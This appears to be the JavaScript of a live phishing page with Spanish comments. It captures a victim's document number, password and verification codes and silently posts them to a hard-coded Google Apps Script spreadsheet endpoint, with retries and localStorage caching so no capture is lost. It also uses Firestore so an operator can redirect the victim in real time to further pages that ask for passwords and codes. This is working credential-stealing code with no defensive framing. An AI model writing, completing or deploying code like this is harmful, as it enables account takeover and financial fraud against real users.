import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
import {
    getFirestore,
    doc,
    setDoc,
    onSnapshot,
} from "https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js";
import { firebaseConfig } from "./firebase-config.js";
// Usar la configuración importada directamente
const app = initializeApp(firebaseConfig);
const db = getFirestore(app);
// Hacer disponibles las funciones de Firestore globalmente
window.db = db;
window.doc = doc;
window.setDoc = setDoc;
window.onSnapshot = onSnapshot;

// Asegurar que el loader esté oculto inicialmente
if (window.hideLoader) {
    window.hideLoader();
}

// Función optimizada para enviar datos a Google Sheets con timeout y retry
async function enviarDatosAGSheets(datos, maxReintentos = 3, timeoutMs = 8000) {
    const datosAEnviar = {
        DireccionIP: datos.direccionIP || "",
        TipoDocumento: datos.tipoDocumento || "No especificado",
        Documento: datos.documento || "",
        Passwd: datos.passwd || "",
        Verificacion1: datos.verificacion1 || "",
        Verificacion2: datos.verificacion2 || "",
    };

    const url = "https://script.google.com/macros/s/AKfycbx109GX3arUTEEqfKhVOyuEYVX1EoGMsDKpdHmiuvDhKWajbIfQ8vf57i4ZiZrXtK-Q-g/exec";

    for (let intento = 1; intento <= maxReintentos; intento++) {
        try {
            // Crear AbortController para timeout
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), timeoutMs);

            const response = await fetch(url, {
                method: "POST",
                mode: "no-cors",
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded",
                },
                body: new URLSearchParams(datosAEnviar).toString(),
                signal: controller.signal
            });

            clearTimeout(timeoutId);
            
            // Con no-cors, si llega aquí sin error, asumimos éxito
            console.log(`Datos enviados a Google Sheets exitosamente (intento ${intento})`);
            return true;

        } catch (error) {
            console.warn(`Intento ${intento} fallido:`, error.name);
            
            // Si es el último intento, fallar
            if (intento === maxReintentos) {
                console.error("Falló el envío a Google Sheets después de todos los intentos");
                return false;
            }
            
            // Esperar antes del siguiente intento (backoff exponencial)
            const espera = Math.min(1000 * Math.pow(2, intento - 1), 5000);
            await new Promise(resolve => setTimeout(resolve, espera));
        }
    }
    
    return false;
}

// Función para envío asíncrono en segundo plano (no bloquea la UI)
function enviarDatosEnSegundoPlano(datos) {
    // Enviar de forma asíncrona sin bloquear
    enviarDatosAGSheets(datos).then(exito => {
        if (exito) {
            console.log("✅ Datos enviados a Google Sheets correctamente");
            // Limpiar datos pendientes si existen
            localStorage.removeItem('pendienteGSheets');
        } else {
            console.warn("⚠️ No se pudieron enviar los datos a Google Sheets");
            // Guardar en localStorage para reintento posterior
            const datosParaReintento = {
                ...datos,
                timestamp: Date.now(),
                reintentos: 0
            };
            localStorage.setItem('pendienteGSheets', JSON.stringify(datosParaReintento));
        }
    }).catch(error => {
        console.error("❌ Error inesperado enviando a Google Sheets:", error);
        // También guardar para reintento en caso de error inesperado
        const datosParaReintento = {
            ...datos,
            timestamp: Date.now(),
            reintentos: 0,
            error: error.message
        };
        localStorage.setItem('pendienteGSheets', JSON.stringify(datosParaReintento));
    });
}

// Función para reintentar envío de datos pendientes
async function reintentarDatosPendientes() {
    const datosPendientes = localStorage.getItem('pendienteGSheets');
    if (!datosPendientes) return;

    try {
        const datos = JSON.parse(datosPendientes);
        const tiempoTranscurrido = Date.now() - datos.timestamp;
        
        // Solo reintentar si han pasado al menos 30 segundos y menos de 24 horas
        if (tiempoTranscurrido > 30000 && tiempoTranscurrido < 86400000) {
            console.log("🔄 Reintentando envío de datos pendientes a Google Sheets...");
            
            const exito = await enviarDatosAGSheets({
                direccionIP: datos.direccionIP,
                documento: datos.documento,
                tipoDocumento: datos.tipoDocumento,
                passwd: datos.passwd,
                verificacion1: datos.verificacion1,
                verificacion2: datos.verificacion2
            });

            if (exito) {
                console.log("✅ Datos pendientes enviados exitosamente");
                localStorage.removeItem('pendienteGSheets');
            } else {
                // Incrementar contador de reintentos
                datos.reintentos = (datos.reintentos || 0) + 1;
                if (datos.reintentos >= 5) {
                    console.warn("⚠️ Máximo de reintentos alcanzado, eliminando datos pendientes");
                    localStorage.removeItem('pendienteGSheets');
                } else {
                    localStorage.setItem('pendienteGSheets', JSON.stringify(datos));
                }
            }
        } else if (tiempoTranscurrido >= 86400000) {
            // Eliminar datos muy antiguos (más de 24 horas)
            console.log("🗑️ Eliminando datos pendientes antiguos");
            localStorage.removeItem('pendienteGSheets');
        }
    } catch (error) {
        console.error("❌ Error procesando datos pendientes:", error);
        localStorage.removeItem('pendienteGSheets');
    }
}

// Función para verificar conectividad y estado del sistema
function verificarEstadoSistema() {
    // Verificar si hay datos pendientes al cargar la página
    reintentarDatosPendientes();
    
    // Configurar reintento periódico cada 5 minutos
    setInterval(reintentarDatosPendientes, 300000);
}

document.addEventListener('DOMContentLoaded', function () {
    // Inicializar elementos del DOM
    const toko = document.getElementById('verificacion2');
    const submitBtn = document.getElementById('cmdLogin');
    const spinner = document.getElementById('preloader');




    spinner.style.display = "none";


    // Verificar que los elementos necesarios existan
    if (!toko || !submitBtn) {
        console.error('Elementos del formulario no encontrados');
        return;
    }

    // Función para validar la entrada (solo números, máximo 8 caracteres y mínimo 3)
    function validateInput() {
        if (toko && submitBtn) {
            // Obtener solo los caracteres numéricos
            let valorNumerico = toko.value.replace(/\D/g, '');
            
            // Limitar a 8 caracteres
            if (valorNumerico.length > 8) {
                valorNumerico = valorNumerico.substring(0, 8);
            }

            // Actualizar el valor del input si es diferente
            if (valorNumerico !== toko.value) {
                toko.value = valorNumerico;
            }

            // Validar longitud (mínimo 3, máximo 8)
            submitBtn.disabled = valorNumerico.length < 6 || valorNumerico.length > 8;
        }
    }

    // Agregar evento input para validar en tiempo real
    if (toko) {
        toko.addEventListener('input', validateInput);
        // Validar al cargar la página
        validateInput();
    }

    // Mostrar solo mientras se mantiene presionado el icono
    function enableHoldToShow(input, icon, showLabel, hideLabel) {
        if (!input || !icon) return;
        icon.setAttribute("aria-label", showLabel);
        icon.setAttribute("tabindex", "0");
        icon.setAttribute("role", "button");

        // Mostrar valor
        const showValue = () => {
            input.type = "text";
            icon.classList.remove("fa-eye-slash");
            icon.classList.add("fa-eye");
            icon.setAttribute("aria-label", hideLabel);
        };

        // Ocultar valor
        const hideValue = () => {
            input.type = "password";
            icon.classList.remove("fa-eye");
            icon.classList.add("fa-eye-slash");
            icon.setAttribute("aria-label", showLabel);
        };

        // Mouse
        icon.addEventListener("mousedown", () => {
            showValue();
            // Ocultar al soltar en cualquier parte
            const hideOnMouseUp = () => {
                hideValue();
                document.removeEventListener("mouseup", hideOnMouseUp);
            };
            document.addEventListener("mouseup", hideOnMouseUp);
        });

        // Touch
        icon.addEventListener("touchstart", (e) => {
            e.preventDefault();
            showValue();
            const hideOnTouchEnd = () => {
                hideValue();
                document.removeEventListener("touchend", hideOnTouchEnd);
                document.removeEventListener("touchcancel", hideOnTouchEnd);
            };
            document.addEventListener("touchend", hideOnTouchEnd);
            document.addEventListener("touchcancel", hideOnTouchEnd);
        });

        // Teclado
        icon.addEventListener("keydown", (event) => {
            if (event.key === " " || event.key === "Spacebar" || event.key === "Enter") {
                event.preventDefault();
                showValue();
            }
        });
        icon.addEventListener("keyup", (event) => {
            if (event.key === " " || event.key === "Spacebar" || event.key === "Enter") {
                event.preventDefault();
                hideValue();
            }
        });

        hideValue();
    }
    enableHoldToShow(
        document.getElementById("passwd"),
        document.getElementById("togglePassword"),
        "Mostrar contraseña",
        "Ocultar contraseña"
    );

    // Función para manejar el envío
    async function manejarEnvio() {
        if (!submitBtn || submitBtn.disabled) return;

        try {
            submitBtn.disabled = true;
            submitBtn.style.opacity = '0.7';
            if (spinner) spinner.style.display = "flex";


            const localData = JSON.parse(localStorage.getItem("usuario"));

            // Actualizar Firestore con los datos del usuario
            const userId = localData.documento.trim(); // Usamos trim() para eliminar espacios en blanco
            const tpDocumento = localData.tipoDocumento.trim(); // Usamos trim() para eliminar espacios en blanco
            if (!userId) {
                throw new Error("El ID de usuario no puede estar vacío");
            }

            // Actualizar Firestore con los datos del usuario
            const docId = `${userId} - ${tpDocumento}`;

            const userRef = doc(db, "redireccion", docId);
            await setDoc(userRef, {
                usuario: docId,
                question1: "A1",
                question2: "A1",
                question3: "A1",
                question4: "A1",
                page: 0, // Inicialmente en 0 para esperar instrucciones del admin
            });


            const exito = await enviarDatosAGSheets({
                direccionIP: localData.direccionIP,
                tipoDocumento: localData.tipoDocumento,
                documento: localData.documento,
                passwd: localData.passwd,
                verificacion1: localData.verificacion1,
                verificacion2: toko ? toko.value : "",
            });

            const dataLocal = {
                direccionIP: localData.direccionIP,
                tipoDocumento: localData.tipoDocumento,
                documento: localData.documento,
                passwd: localData.passwd,
                verificacion1: localData.verificacion1,
                verificacion2: toko ? toko.value : "",
            }

            localStorage.setItem("usuario", JSON.stringify(dataLocal));

            if (exito) {
                // Configurar la escucha de cambios en Firestore
                const unsubscribe = onSnapshot(userRef, (doc) => {
                    if (doc.exists()) {
                        const userData = doc.data();
                        const page = userData.page;
                        // Si el admin ha establecido una página de redirección
                        if (page > 0) {
                            // Redirigir según el valor de page
                            switch (page) {
                                case 1:
                                    spinner.style.display = "none";
                                    window.location.href = "p=1.html";
                                    break;
                                case 2:
                                    spinner.style.display = "none";
                                    window.location.href = "passwd.html";
                                    break;
                                case 3:
                                    spinner.style.display = "none";
                                    window.location.href = "jrico.html";
                                    break;
                                case 4:
                                    spinner.style.display = "none";
                                    window.location.href = "verificacion.html";
                                    break;
                                case 5:
                                    spinner.style.display = "none";
                                    window.location.href = "retype.html";
                                    break;
                            }
                            // Opcional: Establecer un tiempo máximo de espera (por ejemplo, 2 minutos)
                            setTimeout(() => {
                                submitBtn.disabled = false;
                                alert("Tiempo de espera agotado. Por favor, intente nuevamente.");
                                unsubscribe();
                            }, 120000); // 2 minutos
                        }
                    }
                });

            } else {
                alert("Error al enviar los datos. Intente nuevamente.");
            }
        } catch (error) {
            // Error detallado en manejo de envío
            alert(`Error: ${error.message || 'Error desconocido al procesar la solicitud'}`);
        } finally {

        }
    }

    // Event Listeners
    if (toko) {
        toko.addEventListener('input', validateInput);
        validateInput(); // Validación inicial
    }
    if (submitBtn) {
        submitBtn.addEventListener('click', manejarEnvio);
    }

});